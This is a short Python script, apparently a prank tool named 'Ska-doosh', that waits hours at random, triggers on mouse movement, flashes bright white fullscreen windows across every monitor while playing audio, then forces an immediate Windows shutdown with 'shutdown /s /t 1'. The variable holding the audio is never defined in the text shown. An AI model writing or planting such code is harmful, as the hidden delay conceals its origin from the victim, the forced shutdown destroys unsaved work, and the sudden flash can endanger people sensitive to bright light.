import tkinter as tk
from screeninfo import get_monitors
import base64
import io
from pydub import AudioSegment
from pydub.playback import play
import time
import threading
import os
import random
from pynput.mouse import Listener
monitors = get_monitors()
def on_move(x,y):
    listener.stop()
alpha = 255
def makeApp(xChange,yChange,width,height,isPrimary):
    def fade_to_black():
        global alpha
        if alpha > 0:
            alpha -= 1
            root.configure(bg=f'#{"%02x" % alpha}{"%02x" % alpha}{"%02x" % alpha}')
            root.after(10, fade_to_black)
        else:
            root.destroy()
    root = tk.Tk()
    root.title("Ska-doosh")
    root.configure(bg='white')
    root.after(4000, fade_to_black)
    if isPrimary:
        root.attributes("-fullscreen", True)
    else:
        if xChange >= 0 and yChange >= 0:
            root.geometry(f"{width}x{height}+{xChange}+{yChange}")
        elif xChange >= 0 and yChange < 0:
            root.geometry(f"{width}x{height}+{xChange}{yChange}")
        elif xChange < 0 and yChange >= 0:
            root.geometry(f"{width}x{height}{xChange}+{yChange}")
        else:
            root.geometry(f"{width}x{height}{xChange}{yChange}")
    return root
def playAudio(string):
    audio_data = base64.b64decode(string)
    audio = AudioSegment.from_file(io.BytesIO(audio_data), format="wav")
    play(audio)
def flashbang():
    time.sleep(2.3)
    for monitor in monitors:
        makeApp(monitor.x, monitor.y, monitor.width, monitor.height, monitor.is_primary)
    tk.mainloop()
time.sleep(random.randint(7200,43200))
with Listener(on_move=on_move) as listener:
    listener.join()
time.sleep(30)
t1 = threading.Thread(target=playAudio, args=(string,))
t2 = threading.Thread(target=flashbang)
t1.start()
t2.start()
t1.join()
t2.join()
os.system("shutdown /s /t 1")